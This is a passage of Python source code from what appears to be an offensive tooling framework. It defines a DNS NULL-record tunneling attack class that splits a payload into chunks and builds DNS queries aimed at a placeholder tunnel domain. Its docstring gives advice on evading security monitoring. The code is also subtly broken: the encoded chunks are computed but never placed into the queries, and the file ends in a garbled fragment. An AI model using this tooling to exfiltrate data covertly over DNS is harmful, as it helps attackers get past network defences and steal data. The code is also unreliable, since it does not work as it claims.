    description="Tunnels binary data through DNS NULL record queries with no encoding overhead",
)
class DNSNullTunnelingAttack(DNSAttackBase):
    """
    DNS NULL record tunneling attack.

    Uses DNS NULL records (type 10) to tunnel binary data. NULL records can
    contain arbitrary binary data without encoding requirements, making them
    the most efficient DNS tunneling method for binary payloads.

    Encoding Schemes:
        - binary: Direct binary data (no encoding overhead)
        - hex: Used only for domain name metadata

    Features:
        - Direct binary data support (no encoding overhead)
        - Most efficient for binary payloads
        - Automatic chunking for large data
        - Response size limit handling
        - Multi-query sequencing for large payloads

    Size Limits:
        - Standard UDP response: 512 bytes
        - EDNS0 extended response: 4096 bytes
        - Practical limit per query: ~450 bytes (with overhead)
        - No encoding expansion (1:1 data ratio)

    Performance Characteristics:
        - Encoding overhead: 0% (binary data)
        - Execution time: < 8ms for typical payloads
        - Memory overhead: Minimal (direct binary handling)
        - Network efficiency: Best among DNS tunneling methods
        - Throughput: ~450 bytes per query (no encoding)

    DNS Server Compatibility:
        - NULL record support varies by DNS server
        - Some DNS servers filter or block NULL records
        - Less common than A or TXT records
        - May be flagged by security monitoring
        - Works with BIND, PowerDNS, and most authoritative servers

    Trade-offs:
        - Most efficient (no encoding overhead)
        - Less compatible (NULL records less common)
        - May trigger security alerts
        - Best for controlled environments
        - Requires NULL record support on authoritative server

    Fragmentation:
        - Automatic fragmentation when data exceeds response limits
        - Session-based reassembly for multi-query sequences
        - Binary data preserved without encoding
        - Efficient for large binary payloads

    Security Considerations:
        - NULL records are uncommon and may attract attention
        - Some security systems specifically monitor NULL queries
        - Consider using TXT records for less suspicious tunneling
        - Best used in environments with minimal monitoring

    Example:
        >>> attack = DNSNullTunnelingAttack()
        >>> context = AttackContext(
        ...     payload=b"\x00\x01\x02\x03binary data",
        ...     params={
        ...         'base_domain': 'null.tunnel.example.com',
        ...         'chunk_size': 200,
        ...         'use_edns': True
        ...     }
        ... )
        >>> result = await attack.execute(context)
        >>> print(f"Created {result.metadata['queries']} NULL queries")
    """

    @property
    def name(self) -> str:
        return "dns_null_tunneling"

    @property
    def category(self) -> str:
        return AttackCategories.DNS

    @property
    def required_params(self) -> List[str]:
        return []

    @property
    def optional_params(self) -> Dict[str, Any]:
        return {
            "base_domain": "null.tunnel.example.com",
            "chunk_size": 200,
            "max_response_size": DNS_MAX_RESPONSE_SIZE,
            "use_edns": False,
        }

    def __init__(self):
        """Initialize DNS NULL tunneling attack."""
        super().__init__()
        self._sequence_counter = 0
        self._session_counter = 0
        self._reassembler = DNSResponseReassembler()

    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute DNS NULL tunneling attack.

        Args:
            context: Attack context with payload and parameters

        Returns:
            AttackResult with NULL record queries
        """
        try:
            # Extract parameters
            params = context.params or {}
            base_domain = params.get("base_domain", "null.tunnel.example.com")
            chunk_size = params.get("chunk_size", 200)
            max_response_size = params.get("max_response_size", DNS_MAX_RESPONSE_SIZE)
            use_edns = params.get("use_edns", False)

            # Adjust response size for EDNS
            if use_edns:
                max_response_size = DNS_MAX_RESPONSE_SIZE_EDNS

            # Get payload
            payload = context.payload
            if not payload:
                return AttackResult(
                    status=AttackStatus.ERROR, error_message="No payload data provided"
                )

            # Check if we need response size splitting
            response_chunks = self.split_for_null_response_limit(payload, max_response_size)

            if len(response_chunks) > 1:
                # Use multi-query sequence for large payloads
                logger.info(
                    f"NULL payload requires {len(response_chunks)} queries for response size limits"
                )
                session_id = self._get_next_session_id()

                queries = []
                for seq_num, chunk in enumerate(response_chunks):
                    try:
                        # Encode chunk as hex for domain name
                        encoded = self.encode_hex(chunk)

                        # Create NULL query domain with session info
                        query_domain = f"{session_id:08x}.{seq_num:04x}.{len(response_chunks):04x}.{base_domain}"

                        # Build NULL query
                        query_packet = self.build_dns_query(query_domain, DNS_TYPE_NULL)
                        queries.append(query_packet)

                    except Exception as e:
                        logger.error(f"Failed to create NULL query for chunk {seq_num}: {e}")
                        continue

                if not queries:
                    return AttackResult(
                        status=AttackStatus.FAILURE,
                        error_message="Failed to create any NULL queries",
                    )

                return AttackResult(
                    status=AttackStatus.SUCCESS,
                    modified_payload=b"".join(queries),
                    metadata={
                        "multi_query": True,
                        "session_id": session_id,
                        "chunks": len(response_chunks),
                        "queries": len(queries),
                        "base_domain": base_domain,
                        "max_response_size": max_response_size,
                        "total_size": sum(len(q) for q in queries),
                    },
                )

            # Standard chunking for smaller payloads
            chunks = self._chunk_data(payload, chunk_size)

            # Build NULL queries
            queries = []
            for i, chunk in enumerate(chunks):
                try:
                    # Encode chunk as hex for domain name
                    encoded = self.encode_hex(chunk)

                    # Create NULL query domain
                    seq_id = self._get_next_sequence_id()
                    query_domain = f"{seq_id:08x}.{i:04x}.{len(chunks):04x}.{base_domain}"

                    # Build NULL query
                    query_packet = self.build_dns_query(query_domain, DNS_TYPE_NULL)
                    queries.append(query_packet)

                except Exception as e:
                    logger.error(f"Failed to create NULL query for chunk {i}: {e}")
                    continue

            if not queries:
                return AttackResult(
                    status=AttackStatus.FAILURE, error_message="Failed to create any NULL queries"
                )

            return AttackResult(
                status=AttackStatus.SUCCESS,
                modified_payload=b"".join(queries),
                metadata={
                    "multi_query": False,
                    "chunks": len(chunks),
                    "queries": len(queries),
                    "base_domain": base_domain,
                    "max_response_size": max_response_size,
                    "total_size": sum(len(q) for q in queries),
                },
            )

        except Exception as e:
            logger.error(f"DNS NULL tunneling failed: {e}")
            return AttackResult(status=AttackStatus.ERROR, error_message=str(e))

    def modify_dns_packet(self, packet, context: AttackContext) -> Optional[bytes]:
        """Modify DNS packet (not used for tunneling)."""
        return None

    def encode_data_for_tunnel(self, data: bytes, scheme: str) -> str:
        """Encode data for NULL record (uses hex)."""
        return self.encode_hex(data)

    def decode_data_from_tunnel(self, encoded: str, scheme: str) -> bytes:
        """Decode data from NULL record."""
        return self.decode_hex(encoded)

    def validate_params(self, params: Dict[str, Any]) -> bool:
        """Validate attack parameters."""
        if "chunk_size" in params:
            if not isinstance(params["chunk_size"], int) or params["chunk_size"] < 10:
                return False

        return True

    def get_metadata(self) -> AttackMetadata:
        """Get attack metadata."""
        return AttackMetadata(
            name="DNS NULL Record Tunneling",
            description="Tunnels binary data through DNS NULL record queries",
            category=AttackCategories.DNS,
            required_params=[],
            optional_params={"base_domain": "null.tunnel.example.com", "chunk_size": 200},
            aliases=["dns_null_tunnel", "dns_null_tunneling"],
        )

    def _chunk_data(self, data: bytes, chunk_size: int) -> List[bytes]:
        """Chunk data for NULL records."""
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunks.append(data[i : i + chunk_size])
        return chunks

    def _get_next_sequence_id(self) -> int:
        """Get next sequence ID."""
        seq_id = self._sequence_counter
        self._sequence_counter = (self._sequence_counter + 1) & 0xFFFFFFFF
        return seq_id

    def _get_next_session_id(self) -> int:
        """Get next session ID for multi-query tracking."""
        session_id = self._session_counter
        self._session_counter = (self._session_counter + 1) & 0xFFFFFFFF
        return session_id

    def split_for_null_response_limit(self, data: bytes, max_response_size: int) -> List[bytes]:
        """
        Split data to fit within NULL record response size limits.

        Args:
            data: Data to split
            max_response_size: Maximum response size

        Returns:
            List of data chunks
        """
        # Account for NULL record overhead
        available_size = max_response_size - DNS_RESPONSE_OVERHEAD - 10

        # NULL records can hold binary data directly (no encoding expansion)
        max_data = max(available_size, 10)

        # Split data
        chunks = []
        for i in range(0, len(data), max_data):
            chunks.append(data[i : i + max_data])

        return chunks

    def reassemble_null_response_data(
        self, session_id: int, seq_num: int, total_fragments: int, data: bytes
    ) -> Optional[bytes]:
        """
        Reassemble data from multiple NULL responses.

        Args:
            session_id: Session identifier
            seq_num: Sequence number
            total_fragments: Total fragments expected
            data: Fragment data

        Returns:
            Complete reassembled data if all fragments received
        """
        return self._reassembler.add_fragment(session_id, seq_num, total_fragments, data, "binary")


# DNS attacks are now automatically registered via @register_attack decorators
# No manual registration needed-register DNS attacks: {e}")
